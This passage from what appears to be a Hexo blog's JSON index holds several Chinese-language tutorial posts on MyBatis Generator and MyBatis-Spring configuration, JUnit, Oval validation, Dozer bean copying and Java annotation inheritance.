value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 指定是否只生成domain类，如果设置为true，只生成domain类，如果还配置了sqlMapGenerator，那么在mapper XML文件中，只生成resultMap元素 --&gt; &lt;property name&#x3D;&quot;modelOnly&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 参考 javaModelGenerator 的 rootClass 属性 &lt;property name&#x3D;&quot;rootClass&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 参考javaClientGenerator 的 rootInterface 属性 &lt;property name&#x3D;&quot;rootInterface&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 如果设置了runtimeCatalog，那么在生成的SQL中，使用该指定的catalog，而不是table元素上的catalog &lt;property name&#x3D;&quot;runtimeCatalog&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 如果设置了runtimeSchema，那么在生成的SQL中，使用该指定的schema，而不是table元素上的schema &lt;property name&#x3D;&quot;runtimeSchema&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 如果设置了runtimeTableName，那么在生成的SQL中，使用该指定的tablename，而不是table元素上的tablename &lt;property name&#x3D;&quot;runtimeTableName&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 注意，该属性只针对MyBatis3Simple有用； 如果选择的runtime是MyBatis3Simple，那么会生成一个SelectAll方法，如果指定了selectAllOrderByClause，那么会在该SQL中添加指定的这个order条件； --&gt; &lt;!--&lt;property name&#x3D;&quot;selectAllOrderByClause&quot; value&#x3D;&quot;age desc,username asc&quot;&#x2F;&gt;--&gt; &lt;!-- 如果设置为true，生成的model类会直接使用column本身的名字，而不会再使用驼峰命名方法，比如BORN_DATE，生成的属性名字就是BORN_DATE,而不会是bornDate --&gt; &lt;property name&#x3D;&quot;useActualColumnNames&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- generatedKey用于生成生成主键的方法， 如果设置了该元素，MBG会在生成的&lt;insert&gt;元素中生成一条正确的&lt;selectKey&gt;元素，该元素可选 column:主键的列名； sqlStatement：要生成的selectKey语句，有以下可选项： Cloudscape:相当于selectKey的SQL为： VALUES IDENTITY_VAL_LOCAL() DB2 :相当于selectKey的SQL为： VALUES IDENTITY_VAL_LOCAL() DB2_MF :相当于selectKey的SQL为：SELECT IDENTITY_VAL_LOCAL() FROM SYSIBM.SYSDUMMY1 Derby :相当于selectKey的SQL为：VALUES IDENTITY_VAL_LOCAL() HSQLDB :相当于selectKey的SQL为：CALL IDENTITY() Informix :相当于selectKey的SQL为：select dbinfo(&#39;sqlca.sqlerrd1&#39;) from systables where tabid&#x3D;1 MySql :相当于selectKey的SQL为：SELECT LAST_INSERT_ID() SqlServer :相当于selectKey的SQL为：SELECT SCOPE_IDENTITY() SYBASE :相当于selectKey的SQL为：SELECT @@IDENTITY JDBC :相当于在生成的insert元素上添加useGeneratedKeys&#x3D;&quot;true&quot;和keyProperty属性 &lt;generatedKey column&#x3D;&quot;&quot; sqlStatement&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 该元素会在根据表中列名计算对象属性名之前先重命名列名，非常适合用于表中的列都有公用的前缀字符串的时候， 比如列名为：CUST_ID,CUST_NAME,CUST_EMAIL,CUST_ADDRESS等； 那么就可以设置searchString为&quot;^CUST_&quot;，并使用空白替换，那么生成的Customer对象中的属性名称就不是 custId,custName等，而是先被替换为ID,NAME,EMAIL,然后变成属性：id，name，email； 注意，MBG是使用java.util.regex.Matcher.replaceAll来替换searchString和replaceString的， 如果使用了columnOverride元素，该属性无效； &lt;columnRenamingRule searchString&#x3D;&quot;&quot; replaceString&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 用来修改表中某个列的属性，MBG会使用修改后的列来生成domain的属性； column:要重新设置的列名； 注意，一个table元素中可以有多个columnOverride元素哈~ --&gt; &lt;!--&lt;columnOverride column&#x3D;&quot;username&quot;&gt;--&gt; &lt;!-- 使用property属性来指定列要生成的属性名称 --&gt; &lt;!--&lt;property name&#x3D;&quot;property&quot; value&#x3D;&quot;userName&quot;&#x2F;&gt;--&gt; &lt;!-- javaType用于指定生成的domain的属性类型，使用类型的全限定名 &lt;property name&#x3D;&quot;javaType&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- jdbcType用于指定该列的JDBC类型 &lt;property name&#x3D;&quot;jdbcType&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- typeHandler 用于指定该列使用到的TypeHandler，如果要指定，配置类型处理器的全限定名 注意，mybatis中，不会生成到mybatis-config.xml中的typeHandler 只会生成类似：where id &#x3D; #&#123;id,jdbcType&#x3D;BIGINT,typeHandler&#x3D;com._520it.mybatis.MyTypeHandler&#125;的参数描述 &lt;property name&#x3D;&quot;jdbcType&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!-- 参考table元素的delimitAllColumns配置，默认为false &lt;property name&#x3D;&quot;delimitedColumnName&quot; value&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;!--&lt;&#x2F;columnOverride&gt;--&gt; &lt;!-- ignoreColumn设置一个MGB忽略的列，如果设置了改列，那么在生成的domain中，生成的SQL中，都不会有该列出现 column:指定要忽略的列的名字； delimitedColumnName：参考table元素的delimitAllColumns配置，默认为false 注意，一个table元素中可以有多个ignoreColumn元素 &lt;ignoreColumn column&#x3D;&quot;deptId&quot; delimitedColumnName&#x3D;&quot;&quot;&#x2F;&gt; --&gt; &lt;&#x2F;table&gt; &lt;&#x2F;context&gt;&lt;&#x2F;generatorConfiguration&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(三):MyBatisGenerate的使用","date":"2016-08-11T02:00:00.000Z","path":"2016/08/11/DALMyBatisGenerate的使用/","text":"MyBatisGenerate加入ProjectMyBatisGenerate和其他的Jar包不同，他是一个插件，本身就可以独立运行，不一定非要加入Project，可以在目录里使用命令行操作，但是我选择了加入Project进行工作，你问我为啥。。。我也忘记当时我怎么琢磨的了 配置Pom文件配置POM文件主要是在Plugin的标签下还要再次添加一次dependencies才能够连接到数据库 1234567891011121314151617181920212223242526272829&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;&#x2F;artifactId&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 加入mybatisGenerateCore的Jar包 &lt;version&gt;1.3.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;&#x2F;artifactId&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 加入mybatisGenerate插件 &lt;version&gt;1.3.2&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;verbose&gt;true&lt;&#x2F;verbose&gt; &lt;overwrite&gt;true&lt;&#x2F;overwrite&gt; &lt;configurationFile&gt;src&#x2F;main&#x2F;resources&#x2F;generatorConfig.xml&lt;&#x2F;configurationFile&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 加载配置文件 &lt;&#x2F;configuration&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 该插件运行时需要Mysql链接 &lt;version&gt;$&#123;mysql.version&#125;&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; &lt;&#x2F;plugin&gt; &lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt; 配置完成后可以在Maven里看到插件 准备properties文件properties文件是为了准备一些变量在配置文件generatorConfig.xml中使用，以便于修改和控制 1234567891011121314# 数据库连接参数jdbc.driver&#x3D;com.mysql.jdbc.Driverjdbc.url &#x3D; jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;psas?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8jdbc.username &#x3D; rootjdbc.password &#x3D; root# 包路径配置model.package&#x3D;com.bestpay.psas.dal.model.platformmapper.package&#x3D;com.bestpay.psas.dal.mapper.platformxml.mapper.package&#x3D;mapper.platform# Table配置table.name &#x3D; o_plat_relationtable.domainObject &#x3D; PlatformRelationDO 配置文件generatorConfig.xml(比较复杂)generatorConfig的配置文件十分复杂，细节请参考MyBatisGenerate配置参考,这里仅仅做简单讲解，以及给出一个例子一份简单可用的配置文件 配置文件坑点 配置文件中Context标签里的元素有顺序要求 1元素类型为 &quot;context&quot; 的内容必须匹配 &quot;(property*,plugin*,commentGenerator?,jdbcConnection,javaTypeResolver?,javaModelGenerator,sqlMapGenerator?,javaClientGenerator?,table+)&quot; 在接口mapper里不能使用 同名不同参数 函数 因为配置文件分辨不出来。。。。。然后就是生成失败 配置文件的根节点配置文件以根节点generatorConfiguration开始 123456789&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD MyBatis Generator Configuration 1.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-generator-config_1_0.dtd&quot;&gt;&lt;generatorConfiguration&gt;......&lt;&#x2F;generatorConfiguration&gt; 载入properties文件和准备配置文本123456789101112&lt;generatorConfiguration&gt;&lt;properties resource&#x3D;&quot;properties&#x2F;generatorConfig.properties&quot;&#x2F;&gt;&lt;context id&#x3D;&quot;mysql&quot; defaultModelType&#x3D;&quot;hierarchical&quot; targetRuntime&#x3D;&quot;MyBatis3Simple&quot; &gt;......&#x2F;&#x2F; ！！！！这里将是配置文件的核心内容 ！！！！&lt;&#x2F;context&gt;&lt;&#x2F;generatorConfiguration&gt; Context核心内容配置了什么Context核心内容主要配置了4个方面的内容(参考MyBatis核心逻辑),并且从properties读取文件参数便于管理，而不用每次都到配置文件里更改， 1234567891011121314151617181920&lt;context id&#x3D;&quot;mysql&quot; defaultModelType&#x3D;&quot;hierarchical&quot; targetRuntime&#x3D;&quot;MyBatis3Simple&quot; &gt;......&#x2F;&#x2F;1. 怎么链接数据库&lt;jdbcConnection driverClass&#x3D;&quot;$&#123;jdbc.driver&#125;&quot; connectionURL&#x3D;&quot;$&#123;jdbc.url&#125;&quot; userId&#x3D;&quot;$&#123;jdbc.username&#125;&quot; password&#x3D;&quot;$&#123;jdbc.password&#125;&quot;&gt;...&lt;&#x2F;jdbcConnection&gt;&#x2F;&#x2F;2. 模型映射怎么生成&lt;javaModelGenerator targetPackage&#x3D;&quot;$&#123;model.package&#125;&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;java&quot;&gt;...&lt;&#x2F;javaModelGenerator&gt;&#x2F;&#x2F;3. XML文件怎么生成&lt;sqlMapGenerator targetPackage&#x3D;&quot;$&#123;xml.mapper.package&#125;&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;resources&quot;&gt;...&lt;&#x2F;sqlMapGenerator&gt;&#x2F;&#x2F;4. 接口映射怎么生成&lt;javaClientGenerator targetPackage&#x3D;&quot;$&#123;mapper.package&#125;&quot; type&#x3D;&quot;XMLMAPPER&quot; targetProject&#x3D;&quot;src&#x2F;main&#x2F;java&quot;&gt;...&lt;&#x2F;javaClientGenerator&gt;......&lt;&#x2F;context&gt; 具体的配置细节请参考一份简单可用的MyBatisGenerate配置","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(二):MyBatisSpring的配置","date":"2016-08-11T01:00:00.000Z","path":"2016/08/11/DALMyBatisSpring的配置/","text":"MyBatis/MyBatisSpring/MyBatisGenerateMyBatis有三个容易混淆的概念 MyBatis: 这个是在没有IOC框架下手动操作一个MyBatis类进行数据库读写操作 MyBatisSpring: 这个是在Spring的框架下，借助IOC进行实例化，然后使用@Autowired加载MyBatis类进行数据库操作 MyBatisGenerate: 这个是一个插件，帮助你生成MyBatis类，而不用每一个都手写做大量重复工作 MyBatisSpring的配置MyBatisSpring的pom由于我们大部分情况下都会选用Spring这种IOC控制框架，所以我们就以MyBatisSpring的使用作为教程 12345678910&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mybatis.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mybatis-spring.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; MyBatisSpring放入Spring的配置文件将MyBatisSpring加入Spring只需要配置两个Bean SqlSessionFactoryBean: 这个是用来和数据库建立连接的Session类，因为数据库是采用TCP/IP协议链接的，Session是一种状态管理机制 MapperScannerConfigurer: 这个是用来扫描接口在哪里，并且借助Spring的IOC能力进行实例化 1234567891011121314151617&lt;!-- 配置SqlSessionFactoryBean --&gt;&lt;bean id&#x3D;&quot;sqlSessionFactory&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;proxyDataSource&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;configLocation&quot; value&#x3D;&quot;classpath:mybatis.xml&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;mapperLocations&quot;&gt; &lt;list&gt; &lt;value&gt;classpath:mapper&#x2F;*&#x2F;*Mapper.xml&lt;&#x2F;value&gt; &lt;&#x2F;list&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt;&lt;!-- 自动扫描和注册Mapper接口 basePackage是用来指定Mapper接口文件所在的基包， 在这个基包或其所有子包下面的Mapper接口都将被搜索到。 多个基包之间可以使用逗号或者分号进行分隔 --&gt;&lt;bean class&#x3D;&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name&#x3D;&quot;basePackage&quot; value&#x3D;&quot;com.bestpay.psas.dal.mapper&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;sqlSessionFactoryBeanName&quot; value&#x3D;&quot;sqlSessionFactory&quot; &#x2F;&gt;&lt;&#x2F;bean&gt; 如何开启SqlSessionFactoryBean开启SqlSessionFactoryBean类本身需要3个参数 dataSource: 数据源在哪里，怎么链接数据库，这个一般就是jdbc，参考数据库链接 configLocation: SQLSession的配置文件，可以进行一些多少分钟超时等细节参数的配置 mapperLocations: 在文章MyBatis的逻辑里我们说了被映射的接口并没有实现，XML才是存放了真正的SQL语句，这个属性就是告诉MyBatis去哪里找XML文件 MyBatisSpring的事务委托给Spring根据文章事务的原理我们知道，任何连接到数据库的方法，都应该可以对数据库的事务进行操作，MyBatis虽然是作为持久层框架链接数据库，但是在MyBatisSpring里其并不自己处理事务，而是将事务委托给Spring 并不需要特别的配置，只需要和Spring的transactionManager使用同一个dataSource即可 SqlSessionFactoryBean的简单配置这里用一个例子mybatis.xml文件来展示如何配置SqlSessionFactoryBean 123456789101112131415&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;settings&gt; &lt;setting name&#x3D;&quot;cacheEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;lazyLoadingEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;multipleResultSetsEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;useColumnLabel&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;useGeneratedKeys&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;defaultExecutorType&quot; value&#x3D;&quot;SIMPLE&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;defaultStatementTimeout&quot; value&#x3D;&quot;300000&quot;&#x2F;&gt; &lt;&#x2F;settings&gt;&lt;&#x2F;configuration&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"DataBase Access Layer(一):MyBatis概念和思维","date":"2016-08-11T00:00:00.000Z","path":"2016/08/11/DALMyBatis概念和思维/","text":"MyBatis是什么MyBatis是对JDBC的一种封装，可以让你使用XML文件更方便的管理SQL语句,是持久层框架 最关键解决了什么问题最主要的是可以帮你解决SQL注入等安全性问题,不会因为手滑一个不小心留下一个SQL注入漏洞 持久层和DAL是什么鬼持久层就是把数据写到硬盘里，能放一百年所以叫持久，DAL就是DataBase Access Layer 接入数据库层 MyBatis的奥义MyBatis的中心思想就是把你的数据库拆分成了3个对象 数据模型: 和数据库表的字段一一对应，用来存放数据 SQL接口: 使用一个接口,来完成逻辑操作，例如增删改查，每一张表对应一个接口 SQL实现: 是一个XML文件，和SQL接口一一对应，存放具体的SQL语句，每一张表对应一个XML 字段到模型的映射MyBatis把一个DataBase表格视为一个Model，表格里的每一个字段都是一个参数，例如存在表格User id username password 0 admin admin 那么它会被映射成一个DO Class,其中DO代表Data Object 12345public class UserDO &#123; private Interge id； private String username； private String password；&#125; SQL操作映射成方法对于我们经常见到的增删改查操作，MyBatis会将其应设成一个接口 每一张表对应一个接口 称作Mapper 12345678910public interface UserDOMapper &#123; int insert(UserDO record);&#x2F;&#x2F;增 int delete(UserDO record);&#x2F;&#x2F;删 int updateByPrimaryKey(UserDO record);&#x2F;&#x2F;改 List&lt;UserDO&gt; select(UserDO record);&#x2F;&#x2F;查&#125; SQL语句映射成XML虽然定义了增删改查的方法，但是最终都要通过SQL语句来实现，这些SQL语句就被映射成了XML文件 所谓通过XML管理SQL语句 就是这个意思，该XML与接口同名(UserDOMapper.xml)相当于SQL操作接口的实现 123456789101112131415161718&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot; &gt;&lt;mapper namespace&#x3D;&quot;com.bestpay.psas.dal.mapper.user.UserDOMapper&quot; &gt; ...... &lt;insert id&#x3D;&quot;insert&quot; parameterType&#x3D;&quot;com.bestpay.psas.dal.model.user.UserDO&quot; &gt; insert into o_users (id, user_id, username, password, salt, login_count, user_status, user_role) values (#&#123;id,jdbcType&#x3D;INTEGER&#125;, #&#123;userId,jdbcType&#x3D;VARCHAR&#125;, #&#123;username,jdbcType&#x3D;VARCHAR&#125;, #&#123;password,jdbcType&#x3D;VARCHAR&#125;, #&#123;salt,jdbcType&#x3D;VARCHAR&#125;, #&#123;loginCount,jdbcType&#x3D;INTEGER&#125;, #&#123;userStatus,jdbcType&#x3D;INTEGER&#125;, #&#123;userRole,jdbcType&#x3D;INTEGER&#125;) &lt;&#x2F;insert&gt; .......&lt;&#x2F;mapper&gt; 执行SQL操作在完成了以上三项映射后，我们在逻辑层进行数据库操作，只需要 123UserDO user &#x3D; new UserDO();user.setUsername(&quot;guest&quot;);userDOMapper.insert(user); 而不用每次都准备一个SQL语句，以及各种手滑写错引起SQL注入了","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"React奇怪的函数声明方式理解","date":"2016-08-10T11:00:00.000Z","path":"2016/08/10/React奇怪的函数声明方式理解/","text":"React的函数声明方式有一次看到了一些React的知识，就去看了看它的文档，看到了React的函数都是这样声明的 1void replaceState(object nextState,[function callback]) Rect中这种函数声明方式的含义是 一个名为replaceState的函数，返回值是void 第一个参数是一个object，形参是nextState 第二个参数是一个数组[]，值为回调函数callback的返回值 也就是说你要传入一个state和一个返回值为数组的回调函数，哎，JS真的不适合作为新手入门编程的语言，太灵活了。","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"使用JUnit作单元测试","date":"2016-08-10T08:00:00.000Z","path":"2016/08/10/使用JUnit作单元测试/","text":"JUnitJUnit是一个单元测试框架，使用IntelliJ新建Spring或者Web的Pom工程的话它都会自动给你加载这个包 1234567&lt;!--Junit--&gt;&lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;junit.version&#125;&lt;&#x2F;version&gt; &lt;scope&gt;test&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt; 如何使用使用方法是满足这两点 跟随哪个类进行启动，一般在Spring工程下就是SpringJUnit4ClassRunner这个类专门用来测试 使用哪个Spring的配置文件@ContextConfiguration 然后在函数前打上Test标签，就可以单独测试这一段函数而不用使用容器启动整个工程了 12345678@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(value &#x3D; &quot;classpath:spring&#x2F;applicationContext.xml&quot;)public abstract class BaseSpringTest &#123; @Test void insert() &#123; ..... &#125;&#125; 除了Test还有哪些用法除了@Test注解之外还有 12345678@Before : 初始化方法，对于每一个测试方法都要执行一次（注意与BeforeClass区别，后者是对于所有方法执行一次）@After : 释放资源，对于每一个测试方法都要执行一次（注意与AfterClass区别，后者是对于所有方法执行一次）@BeforeClass : 针对所有测试，只执行一次，且必须为static void@AfterClass : 针对所有测试，只执行一次，且必须为static void@Ignore : 忽略的测试方法@Parameterized.Parameter : 准备一个数据用来测试@Parameterized.Parameters : 准备一组数据用来测试 其中Parameters有以下要求 该方法必须为public static的 该方法返回值必须为java.util.Collection类型 该方法的名字不做要求 该方法没有参数","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JUnit","slug":"JUnit","permalink":"http://yoursite.com/tags/JUnit/"}]},{"title":"使用Oval作参数检查","date":"2016-08-10T07:00:00.000Z","path":"2016/08/10/使用Oval作参数检查/","text":"参数检查在服务器接收参数的时候，总会做一些检查，比如不能为空或者不能大于多少小于多少，Oval就是一个工具通过注解来完成这些工作 123456&lt;!--Oval--&gt;&lt;dependency&gt; &lt;groupId&gt;net.sf.oval&lt;&#x2F;groupId&gt; &lt;artifactId&gt;oval&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;oval.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 检查工具类首先我们要使用Oval创建一个检查工具，用于我们检查模型 1234567891011121314151617181920212223242526public class VerifyUtil &#123; private static Validator validator &#x3D; new Validator(); &#x2F;** * 请求参数非空、格式验证，请求对象 * @param object 请求校验参数 *&#x2F; public static void validateObject(Object object) throws Exception &#123; List&lt;ConstraintViolation&gt; list &#x3D; validator.validate(object); if (null !&#x3D; list &amp;&amp; !list.isEmpty()) &#123; throw new Exception(); &#125; &#125; &#x2F;** * 校验参数是否非空 * @param object 待验证对象 * @throws Exception 参数为空 *&#x2F; public static void validateNull(Object object) throws Exception &#123; if (object &#x3D;&#x3D; null) &#123; throw new Exception(); &#125; &#125;&#125; 使用注解进行参数检查当我们一个类有很多个参数的时候，可能一个一个去校验，只需要在参数参数上打上注解，然后使用 VerifyUtil.validateObject() 就可以对注解进行检查了 12345678public class UserReqDTO implements Serializable&#123; @Length(max &#x3D; 100, message &#x3D; &quot;inflName应当小于$&#123;max&#125;个字符&quot;) &lt;&#x3D;&#x3D;&#x3D;&#x3D; 对String进行长度检查 private String inflName; @Range(min &#x3D; 0, max &#x3D; 6, message &#x3D; &quot;userStatus应该处于$&#123;min&#125;和$&#123;max&#125;之间&quot;) &lt;&#x3D;&#x3D;&#x3D;&#x3D; 对Integer进行长度检查 private Integer userStatus;&#125; 使用检查工具检查 12UserReqDTO userReqDTO &#x3D; new UserReqDTO();VerifyUtil.validateObject(userReqDTO); 甚至还可以使用自定义函数进行检查 12345678@ValidateWithMethod(methodName &#x3D; &quot;isValidDay&quot;, parameterType &#x3D; int.class)private int day &#x3D; 31;private boolean isValidDay(int day)&#123; ........ return true;&#125; ${}取值在编辑返回错误信息的时候有个${}符号可以动态的取max和min的值，但是也有个问题 @Length 中 max 和 min 是整数， 看到的返回消息还没问题 @Range 中 max 和 min 是Double类型，取出来的消息总是20.0, 1.0这种带小数点的 至于这个 带小数点的问题如何解决 我在官方文档里也没找到合适解决方式，希望知道的留言或者联系我，十分感谢 Oval都有哪些注解以下只是作为参考，我随便写的，还是以官方文档为主 注解参数 参数注解 无参数 @NotNull、@NotBlank、@Url、@Email、@NotNegative、@CFuture、@CPast 一个参数 @Max、@Min 两个参数 @Length、@Range、@DateRange、@HasSubstring 自定义 @Assert、@CheckWith、@ValidateWithMethod、@MatchPatternCheck","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Parameter","slug":"Parameter","permalink":"http://yoursite.com/tags/Parameter/"},{"name":"Oval","slug":"Oval","permalink":"http://yoursite.com/tags/Oval/"}]},{"title":"BeanCopy的小工具Dozer","date":"2016-08-10T06:00:00.000Z","path":"2016/08/10/BeanCopy的小工具Dozer/","text":"不同的Model之间拷贝来拷贝去有个小工具可以方便不同层之间相同参数的Model拷贝来拷贝去，其POM文件为 123456&lt;!--Dozer--&gt;&lt;dependency&gt; &lt;groupId&gt;net.sf.dozer&lt;&#x2F;groupId&gt; &lt;artifactId&gt;dozer&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;dozer.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 不同功能的拷贝首先声明一个工具类 12345public class BeanMapperUtil &#123; &#x2F;*** 持有Dozer单例, 避免重复创建DozerMapper消耗资源.***&#x2F; private static DozerBeanMapper dozer &#x3D; new DozerBeanMapper(); ......&#125; 覆盖式拷贝用source里的参数覆盖目标的同名参数 12345public static void copy(Object source, Object toObj) &#123; if (null !&#x3D; source) &#123; dozer.map(source, toObj); &#125;&#125; 转化式拷贝new一个Object，然后把相同的参数用source里的参数赋值 123456public static &lt;T&gt; T objConvert(Object obj, Class&lt;T&gt; toObj) &#123; if (null &#x3D;&#x3D; obj) &#123; return null; &#125; return dozer.map(obj, toObj);&#125; 更新式拷贝这里没有用到dozer，是我自己写的反射，因为有些时候我想把source里不为空的数据拷贝到target里，为null的数据不拷贝，如果使用第一个覆盖式拷贝，null值会把target里有值的覆盖掉。 123456789101112131415161718192021public static void objUpdate(Object infoObject, Object targetObject)&#123; Field[] infoFields &#x3D; infoObject.getClass().getDeclaredFields(); Field[] targetFields &#x3D; targetObject.getClass().getDeclaredFields(); try &#123; for (Field info:infoFields) &#123; info.setAccessible(true); if (info.get(infoObject) !&#x3D; null &amp;&amp; !info.getName().equals(&quot;serialVersionUID&quot;) )&#123; for (Field target:targetFields) &#123; target.setAccessible(true); if (target.getName() &#x3D;&#x3D; info.getName())&#123; target.set(targetObject,info.get(infoObject)); break; &#125; &#125; &#125; &#125; &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125;&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Dozer","slug":"Dozer","permalink":"http://yoursite.com/tags/Dozer/"}]},{"title":"Annotation无法被Override继承","date":"2016-08-10T04:00:00.000Z","path":"2016/08/10/Annotation无法被Override继承/","text":"在接口上写Annotation在写单元测试的时候，有几个函数要写好多份，所以想写个协议然后直接Override 12345public interface BaseTest &#123; @Test void insert(); ......&#125; 结果发现实现了BaseTest接口的类不能运行，说明@Test写在接口上并不能被其实现类继承 123456789public class TestClass implements BaseTest &#123; @Override public void insert() &#123; &#125; .......&#125; 什么情况下Annotation可以被继承在定义注解时加了 @Inherited 元注解的才能被继承，比如Test类里的ContextConfiguration 1234567@Documented@Inherited@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.TYPE&#125;)public @interface ContextConfiguration &#123; .......&#125; 然后我们可以声明一个基类 12345@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(value &#x3D; &quot;classpath:spring&#x2F;applicationContext.xml&quot;)public abstract class BaseSpringTest &#123;&#125; 所以说上式可以写成 1public class TestClass extends BaseSpringTest implements BaseTest 也能够使用classpath:spring/applicationContext.xml的配置","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Annotation","slug":"Annotation","permalink":"http://yoursite.com/tags/Annotation/"}]},{"title":"被注释的代码还能运行","date":"2016-08-10T04:00:00.000Z","path":"2016/08/10/被注释的代码还能运行/","text":"(╯°Д°）╯︵ /(.□ . \\) 